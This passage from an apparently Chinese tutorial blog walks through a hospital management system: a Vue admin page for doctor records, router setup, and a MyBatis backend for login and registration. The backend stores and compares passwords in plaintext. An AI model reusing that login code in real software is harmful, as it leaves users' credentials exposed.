&#125;&#125;&lt;/span&gt;--&gt;<br>&lt;!--              &lt;/el-form-item&gt;--&gt;<br>              &lt;el-form-item label=&quot;职称:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.sort &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;费用:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.fee &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;科室:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.department &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;个人介绍:&quot; style=&quot;width: 700px;&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.introduction &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>            &lt;/el-form&gt;<br>          &lt;/template&gt;<br>        &lt;/el-table-column&gt;<br><br>        &lt;!--        主要表单--&gt;<br>        &lt;el-table-column<br>          prop=&quot;name&quot;<br>          label=&quot;姓名&quot;<br>          width=&quot;100&quot;<br>        &gt;<br>          &lt;template slot-scope=&quot;scope&quot;&gt;<br>            &lt;el-popover trigger=&quot;hover&quot; placement=&quot;top&quot;&gt;<br>              &lt;p&gt;姓名：&#123;&#123; scope.row.name &#125;&#125;&lt;/p&gt;<br>              &lt;p&gt;医生介绍：&#123;&#123; scope.row.introduction &#125;&#125;&lt;/p&gt;<br>              &lt;div slot=&quot;reference&quot; class=&quot;name-wrapper&quot;&gt;<br>                &lt;el-tag size=&quot;medium&quot;&gt;&#123;&#123; scope.row.name &#125;&#125;&lt;/el-tag&gt;<br>              &lt;/div&gt;<br>            &lt;/el-popover&gt;<br>          &lt;/template&gt;<br>        &lt;/el-table-column&gt;<br><br>        &lt;el-table-column<br>          prop=&quot;sex&quot;<br>          label=&quot;性别&quot;<br>          width=&quot;70&quot;<br>          :sex=&quot;sex&quot;<br>        &gt;&lt;/el-table-column&gt;<br><br>        &lt;el-table-column<br>          prop=&quot;sort&quot;<br>          label=&quot;职称&quot;<br>          width=&quot;150&quot;<br>          :sort=&quot;sort&quot;<br>        &gt;&lt;/el-table-column&gt;<br><br>        &lt;el-table-column<br>          prop=&quot;age&quot;<br>          label=&quot;年龄&quot;<br>          width=&quot;100&quot;<br>          :age=&quot;age&quot;<br>        &gt;&lt;/el-table-column&gt;<br><br>        &lt;el-table-column<br>          prop=&quot;department&quot;<br>          label=&quot;科室&quot;<br>          width=&quot;150&quot;<br>          :filters=&quot;[<br>            &#123; text : &#x27;神经内科&#x27;, value : &#x27;神经内科&#x27;&#125;,<br>            &#123; text : &#x27;内科&#x27;, value : &#x27;内科&#x27;&#125;,<br>            &#123; text : &#x27;外科&#x27;, value : &#x27;外科&#x27;&#125;,<br>            &#123; text : &#x27;妇产科&#x27;, value : &#x27;妇产科&#x27;&#125;,<br>            &#123; text : &#x27;儿科&#x27;, value : &#x27;儿科&#x27;&#125;,<br>            &#123; text : &#x27;眼科&#x27;, value : &#x27;眼科&#x27;&#125;,<br>            &#123; text : &#x27;耳鼻喉科&#x27;, value : &#x27;耳鼻喉科&#x27;&#125;,<br>            &#123; text : &#x27;口腔科&#x27;, value : &#x27;口腔科&#x27;&#125;,<br>            &#123; text : &#x27;皮肤科&#x27;, value : &#x27;皮肤科&#x27;&#125;,<br>            &#123; text : &#x27;肿瘤科&#x27;, value : &#x27;肿瘤科&#x27;&#125;,<br>            &#123; text : &#x27;中医科&#x27;, value : &#x27;中医科&#x27;&#125;,<br>            &#123; text : &#x27;体检中心&#x27;, value : &#x27;体检中心&#x27;&#125;<br>          ]&quot;<br>          :filter-method=&quot;filterTag&quot;<br>          filter-placement=&quot;bottom-end&quot;<br>        &gt;<br>          &lt;template slot-scope=&quot;scope&quot;&gt;<br>            &lt;el-tag&gt;&#123;&#123; scope.row.department &#125;&#125;<br>            &lt;/el-tag&gt;<br>          &lt;/template&gt;<br>        &lt;/el-table-column&gt;<br><br>        &lt;el-table-column<br>          fixed=&quot;right&quot;<br>          label=&quot;操作&quot;<br>          width=&quot;200&quot;<br>        &gt;<br>          &lt;template slot=&quot;header&quot; slot-scope=&quot;scope&quot;&gt;<br>            &lt;el-input<br>              v-model=&quot;val&quot;<br>              size=&quot;medium&quot;<br>              placeholder=&quot;输入关键字搜索&quot;<br>              @keyup.enter.native=&quot;search&quot;/&gt;<br>            &lt;el-button style=&quot;margin-right: 10px&quot; @click=&quot;search()&quot;&gt;搜索&lt;/el-button&gt;<br>          &lt;/template&gt;<br><br>          &lt;template slot-scope=&quot;scope&quot;&gt;<br>            &lt;el-button<br>              size=&quot;mini&quot;<br>              @click=&quot;handleEdit(scope.$index, scope.row)&quot;<br>            &gt;编辑<br>            &lt;/el-button&gt;<br>            &lt;el-button<br>              size=&quot;mini&quot;<br>              type=&quot;danger&quot;<br>              @click=&quot;handleDelete(scope.$index, scope.row)&quot;<br>            &gt;删除<br>            &lt;/el-button&gt;<br>          &lt;/template&gt;<br>        &lt;/el-table-column&gt;<br>      &lt;/el-table&gt;<br>      &lt;pagination<br>        v-show=&quot;total &gt; 0&quot;<br>        :total=&quot;total&quot;<br>        :page.sync=&quot;page.current&quot;<br>        :limit.sync=&quot;page.size&quot;<br>        @pagination=&quot;getDoctor&quot;/&gt;<br>    &lt;/div&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br><br>import &#123;<br>  deleteDoctor,<br>  addDoctor,<br>  getDoctor,<br>  editDoctor,<br>  searchByDoctorName, addDoctorUser<br>&#125; from &#x27;@/api/admin&#x27;<br>import &#123; register &#125; from &#x27;@/api/register&#x27;<br>import Pagination from &#x27;@/components/Pagination&#x27;<br><br>export default &#123;<br>  name: &#x27;Doctor&#x27;,<br>  edit: false,<br>  components: &#123;Pagination&#125;,<br>  created () &#123;<br>    this.getDoctor()<br>  &#125;,<br>  data () &#123;<br>    return &#123;<br>      fileList: [],<br>      val: &#x27;&#x27;,<br>      tableData: [],<br>      total: 10,<br>      page: &#123;<br>        current: 1,<br>        size: 10<br>      &#125;,<br>      dialogFormVisible: false,<br>      doctorForm: &#123;<br>        name: &#x27;&#x27;,<br>        sex: &#x27;&#x27;,<br>        idCard: &#x27;&#x27;,<br>        age: &#x27;&#x27;,<br>        birth: &#x27;&#x27;,<br>        image: &#x27;&#x27;,<br>        introduction: &#x27;&#x27;,<br>        department: &#x27;&#x27;,<br>        sort: &#x27;&#x27;,<br>        fee: &#x27;&#x27;,<br>        telephone: &#x27;&#x27;,<br>        password: &#x27;&#x27;,<br>        flag: &#x27;&#x27;<br>      &#125;,<br>      // 表单验证，需要在el-form-item元素中增加prop属性<br>      rules: &#123;<br>        name: [<br>          &#123;required: true, message: &#x27;姓名不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        sex: [<br>          &#123;required: true, message: &#x27;性别不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        idCard: [<br>          &#123;required: true, message: &#x27;身份证号不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        age: [<br>          &#123;required: true, message: &#x27;年龄不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        birth: [<br>          &#123;required: true, message: &#x27;生日不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        // image: [<br>        //   &#123;required: true, message: &#x27;照片不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        // ],<br>        introduction: [<br>          &#123;required: true, message: &#x27;个人介绍不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        sort: [<br>          &#123;required: true, message: &#x27;职称不可为空&#x27;,  trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        department: [<br>          &#123;required: true, message: &#x27;科室不可为空&#x27;,  trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        fee: [<br>          &#123;required: true, message: &#x27;费用不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        telephone: [<br>          &#123;required: true, message: &#x27;电话不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        password: [<br>          &#123;required: true, message: &#x27;密码不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>      &#125;,<br>      // 对话框和显示<br>      dialogVisible: false,<br>      tabMapDepartments: [<br>        &#123;label: &#x27;神经内科&#x27;, key: &#x27;神经内科&#x27;&#125;,<br>        &#123;label: &#x27;内科&#x27;, key: &#x27;内科&#x27;&#125;,<br>        &#123;label: &#x27;外科&#x27;, key: &#x27;外科&#x27;&#125;,<br>        &#123;label: &#x27;妇产科&#x27;, key: &#x27;妇产科&#x27;&#125;,<br>        &#123;label: &#x27;儿科&#x27;, key: &#x27;儿科&#x27;&#125;,<br>        &#123;label: &#x27;眼科&#x27;, key: &#x27;眼科&#x27;&#125;,<br>        &#123;label: &#x27;耳鼻喉科&#x27;, key: &#x27;耳鼻喉科&#x27;&#125;,<br>        &#123;label: &#x27;口腔科&#x27;, key: &#x27;口腔科&#x27;&#125;,<br>        &#123;label: &#x27;皮肤科&#x27;, key: &#x27;皮肤科&#x27;&#125;,<br>        &#123;label: &#x27;肿瘤科&#x27;, key: &#x27;肿瘤科&#x27;&#125;,<br>        &#123;label: &#x27;中医科&#x27;, key: &#x27;中医科&#x27;&#125;,<br>        &#123;label: &#x27;体检中心&#x27;, key: &#x27;体检中心&#x27;&#125;,<br>      ],<br>      tabMapSorts: [<br>        &#123;label: &#x27;科室主任&#x27;, key: &#x27;科室主任&#x27;&#125;,<br>        &#123;label: &#x27;科室副主任&#x27;, key: &#x27;科室副主任&#x27;&#125;,<br>        &#123;label: &#x27;科室专家&#x27;, key: &#x27;科室专家&#x27;&#125;,<br>        &#123;label: &#x27;主治医师&#x27;, key: &#x27;主治医师&#x27;&#125;,<br>        &#123;label: &#x27;副主治医师&#x27;, key: &#x27;副主治医师&#x27;&#125;,<br>      ],<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    getDoctor () &#123;<br>      getDoctor(this.page).then((res) =&gt; &#123;<br>        this.tableData = res.data<br>        this.total = res.total<br>      &#125;)<br>    &#125;,<br>    search () &#123;<br>      searchByDoctorName(this.val, this.page.current, this.page.size).then((res) =&gt; &#123;<br>        this.tableData = res.data<br>        this.total = res.total<br>      &#125;)<br>    &#125;,<br>    handleCreate () &#123;<br>      this.dialogFormVisible = true<br>      this.doctorForm = &#123;<br>        name: &#x27;&#x27;,<br>        sex: &#x27;&#x27;,<br>        idCard: &#x27;&#x27;,<br>        telephone: &#x27;&#x27;,<br>        age: &#x27;&#x27;,<br>        birth: &#x27;&#x27;,<br>        image: &#x27;&#x27;,<br>        sort: &#x27;&#x27;,<br>        department: &#x27;&#x27;,<br>        fee: &#x27;&#x27;,<br>        introduction: &#x27;&#x27;,<br>        password: &#x27;&#x27;,<br>        flag: &#x27;&#x27;<br>      &#125;<br>    &#125;,<br>    createData (formName) &#123;<br>      this.$refs[formName].validate((vaild) =&gt; &#123;<br>        if (vaild) &#123;<br>          if (this.editDoctor) &#123;<br>            // 为表单绑定验证功能<br>            editDoctor(this.doctorForm)<br>            this.editDoctor = false<br>            this.$notify(&#123;<br>              title: &#x27;提示信息&#x27;,<br>              message: &#x27;修改成功&#x27;,<br>              type: &#x27;success&#x27;<br>            &#125;)<br>            this.getDoctor()<br>            this.getDoctor()<br>            this.dialogFormVisible = false<br>          &#125; else &#123;<br>            console.log(&#x27;start&#x27;)<br>            addDoctor(this.doctorForm)<br>            addDoctorUser(this.doctorForm.telephone, this.doctorForm.password, this.doctorForm.name, this.doctorForm.flag)<br>            this.editDoctor = false<br>            this.$notify(&#123;<br>              title: &#x27;提示信息&#x27;,<br>              message: &#x27;添加成功&#x27;,<br>              type: &#x27;success&#x27;<br>            &#125;)<br>            this.getDoctor()<br>            this.getDoctor()<br>            this.dialogFormVisible = false<br>          &#125;<br>        &#125; else &#123;<br>          this.dialogVisible = true<br>          this.getDoctor()<br>          this.getDoctor()<br>          return false<br>        &#125;<br>      &#125;)<br>    &#125;,<br>    sex (row, column) &#123;<br>      return row.sex<br>    &#125;,<br>    department (row, column) &#123;<br>      return row.department<br>    &#125;,<br>    sort (row, column) &#123;<br>      return row.sort<br>    &#125;,<br>    telephone (row, column) &#123;<br>      return row.telephone<br>    &#125;,<br>    age (row, column) &#123;<br>      return row.age<br>    &#125;,<br>    image (row, column) &#123;<br>      return row.image<br>    &#125;,<br>    handleEdit (index, row) &#123;<br>      this.dialogFormVisible = true<br>      this.editDoctor = true<br>      this.doctorForm = row<br>    &#125;,<br>    handleDelete (index, row) &#123;<br>      this.$confirm(&#x27;确认删除？&#x27;, &#x27;确认信息&#x27;, &#123;<br>        distinguishCancelAndClose: true,<br>        confirmButtonText: &#x27;删除&#x27;,<br>        cancelButtonText: &#x27;放弃删除&#x27;<br>      &#125;).then(() =&gt; &#123;<br>        deleteDoctor(row.id)<br>        this.getDoctor()<br>        this.$message(&#123;<br>          type: &#x27;info&#x27;,<br>          message: &#x27;删除成功&#x27;<br>        &#125;);<br>      &#125;).catch(action =&gt; &#123;<br>      &#125;);<br>    &#125;,<br>    //根据标签刷新<br>    filterHandler(value, row, column) &#123;<br>      const property = column[&#x27;property&#x27;];<br>      return row[property] === value;<br>    &#125;,<br>    filterTag(value, row) &#123;<br>      console.log(this.tableData)<br>      return row.department=== value<br>    &#125;,<br>    //清除标签<br>    clearFilter() &#123;<br>      this.$refs.filterTable.clearFilter()<br>    &#125;,<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br>.demo-table-expand &#123;<br>  font-size: 0;<br>&#125;<br><br>.demo-table-expand label &#123;<br>  width: 90px;<br>  color: #99a9bf;<br>&#125;<br><br>.demo-table-expand .el-form-item &#123;<br>  margin-right: 0;<br>  margin-bottom: 0;<br>  width: 50%;<br>&#125;<br><br>.block &#123;<br>  position: absolute;<br>  left: 30%;<br>  margin: 30px auto;<br>&#125;<br>&lt;/style&gt;<br><br></code></pre></td></tr></table></figure><p>index.vue内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>      &lt;el-header style=&quot;text-align: right; fontsize: 20px&quot;&gt;<br>        &lt;el-dropdown&gt;<br>          &lt;span&gt;你好，管理员&lt;/span&gt;<br>        &lt;/el-dropdown&gt;<br>      &lt;/el-header&gt;<br>    <br>      &lt;el-container&gt;<br>      &lt;el-aside width=&quot;200px&quot;&gt;<br>        &lt;div class=&quot;title&quot;&gt;&lt;br&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;管 理 员 后 台&lt;/div&gt;<br>        &lt;br&gt;&lt;br&gt;<br>        &lt;el-menu&gt;<br>          &lt;el-menu-item index=&quot;5&quot; @click=&quot;toDoctor()&quot;&gt;<br>              &lt;i class=&quot;el-icon-setting&quot;&gt;&lt;/i&gt;<br>              &lt;template slot=&quot;title&quot;&gt;医生信息管理&lt;/template&gt;<br>          &lt;/el-menu-item&gt;<br>        &lt;/el-menu&gt;<br>      &lt;/el-aside&gt;<br><br>      &lt;el-container&gt;<br>        &lt;el-main class=&quot;main&quot;&gt;<br>          &lt;!--          此处展示视图--&gt;<br>          &lt;transition name=&quot;scale&quot; mode=&quot;out-in&quot;&gt;<br>            &lt;router-view/&gt;<br>          &lt;/transition&gt;<br>        &lt;/el-main&gt;<br>      &lt;/el-container&gt;<br><br>    &lt;/el-container&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;getCurrent, logout&#125; from &#x27;@/api/login&#x27;<br><br>export default &#123;<br>  name: &#x27;Admin&#x27;,<br>  data () &#123;<br>    return &#123;<br>      circleUrl: &#x27;https://cube.elemecdn.com/3/7c/3ea6beec64369c2642b92c6726f1epng.png&#x27;<br>    &#125;<br>  &#125;,<br>  mounted() &#123;<br>    this.getCurrent()<br>  &#125;,<br>  methods: &#123;<br>    toDoctor () &#123;<br>      this.$router.push(&#x27;/admin/doctor&#x27;)<br>    &#125;,<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br><br>.title &#123;<br>  height: 100px;<br>  width: 200px;<br>  background-color: #3d504c;<br>  color: white;<br>&#125;<br><br>.main &#123;<br>  height: 100%;<br>  /*border-radius: 30px;*/<br>  background-image: url(&quot;../../assets/background.png&quot;);<br>  background-size: 270px;<br>  background-color: #ebf3f2;<br>  /*text-align: center;*/<br>&#125;<br><br>.scale-enter, .scale-leave-to &#123;<br>  transform: scale(0)<br>&#125;<br>.scale-leave, .scale-enter-to &#123;<br>  transform: scale(1)<br>&#125;<br>.scale-enter-active, .scale-leave-active &#123;<br>  transition: all .5s<br>&#125;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>vue中所有的页面都需要配置路由，以上述两个页面为例：</p><p>在router中国新建modules文件夹，在modules文件夹中新建admin.js，内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/views/admin/index&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Doctor</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/views/admin/subadmin/Doctor&#x27;</span><br><br><span class="hljs-keyword">const</span> adminRouter = &#123;<br>  <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/admin&#x27;</span>,<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Admin&#x27;</span>,<br>  <span class="hljs-attr">component</span>: <span class="hljs-title class_">Admin</span>,<br>  <span class="hljs-attr">meta</span>: &#123;<br>    <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;管理员界面&#x27;</span>,<br>    <span class="hljs-attr">icon</span>: <span class="hljs-string">&#x27;el-icon-s-help&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">children</span>: [<br>    &#123;<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;doctor&#x27;</span>,<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Doctor&#x27;</span>,<br>      <span class="hljs-attr">component</span>: <span class="hljs-title class_">Doctor</span>,<br>      <span class="hljs-attr">meta</span>: &#123;<br>        <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;医生信息管理&#x27;</span><br>      &#125;<br>    &#125;<br>  ]<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> adminRouter<br></code></pre></td></tr></table></figure><p>router&#x2F;index.js中内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-comment">// 导入vue-router</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Router</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-comment">// 导入组件</span><br><span class="hljs-keyword">import</span> adminRouter <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/router/modules/admin&#x27;</span><br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Router</span>)<br><br><span class="hljs-comment">// 导出</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>(&#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;history&#x27;</span>,<br>  <span class="hljs-attr">routes</span>: [<br>    adminRouter,<br>  ]<br>&#125;)<br></code></pre></td></tr></table></figure><p>基本完成，可通过<a href="http://localhost:8080/admin/doctor%E6%9D%A5%E6%9F%A5%E7%9C%8B%E6%95%88%E6%9E%9C">http://localhost:8080/admin/doctor来查看效果</a></p><h3 id="2、登录注册修改密码及获取当前用户"><a href="#2、登录注册修改密码及获取当前用户" class="headerlink" title="2、登录注册修改密码及获取当前用户"></a>2、登录注册修改密码及获取当前用户</h3><p>&#x3D;&#x3D;后端&#x3D;&#x3D;</p><p>resources&#x2F;mybatis&#x2F;mappers&#x2F;UserMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.xbb.dao.UserMapper&quot;</span>&gt;</span><br>    <br>    <span class="hljs-comment">&lt;!-- 注册 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkRegister&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><br>        select * from user_login where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;addUser&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.xbb.entity.User&quot;</span>&gt;</span><br>        insert into user_login(id,password,flag,username) values(#&#123;id&#125;,#&#123;password&#125;,#&#123;flag&#125;,#&#123;username&#125;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br><br>   <span class="hljs-comment">&lt;!-- 登录 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkLogin&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><br>        select * from user_login where id=#&#123;id&#125; and password=#&#123;password&#125; and flag=#&#123;flag&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 修改密码 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateUser&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span><br>        update user_login set password=#&#123;password&#125; where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>entity&#x2F;User：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.entity;<br><span class="hljs-keyword">import</span> lombok.Data;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String id;<span class="hljs-comment">//手机号</span><br>    <span class="hljs-keyword">private</span> String password;<span class="hljs-comment">//密码</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> flag;<span class="hljs-comment">//用户身份，0代表管理员，1代表患者，2代表医生，3代表护士</span><br>    <span class="hljs-keyword">private</span> String username;<span class="hljs-comment">//用户名</span><br>&#125;<br></code></pre></td></tr></table></figure><p>dao&#x2F;UserMapper：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.dao;<br><span class="hljs-keyword">import</span> com.xbb.entity.User;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">checkRegister</span><span class="hljs-params">(String id)</span>;<span class="hljs-comment">//判断id是否已经存在</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span>;<span class="hljs-comment">//添加用户（注册）</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">checkLogin</span><span class="hljs-params">(User user)</span>;<span class="hljs-comment">//判断手机号、密码和flag是否正确</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(String id,String password)</span>;<span class="hljs-comment">//修改密码（用户）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logout</span><span class="hljs-params">()</span>;<span class="hljs-comment">//登出</span><br>&#125;<br></code></pre></td></tr></table></figure><p>service&#x2F;UserService：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span 